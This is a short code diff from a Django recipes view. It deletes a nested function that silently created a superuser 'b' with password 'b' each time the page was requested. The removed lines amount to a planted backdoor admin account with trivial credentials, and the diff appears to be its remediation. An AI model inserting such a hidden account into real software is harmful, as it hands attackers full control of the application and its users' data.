@@ -253,15 +253,6 @@ def index(request):
             logging.error(f"Error rendering AJAX response: {e}", exc_info=True)
             return JsonResponse({"html": error_html, "error": str(e)}, status=500)
 
-    def ready(self):
-        from django.contrib.auth import get_user_model
-
-        User = get_user_model()
-        if not User.objects.filter(username="b").exists():
-            User.objects.create_superuser("b", "b@b.com", "b")
-
-    ready()
-
     return render(
         request,
         "recipes/index.html",
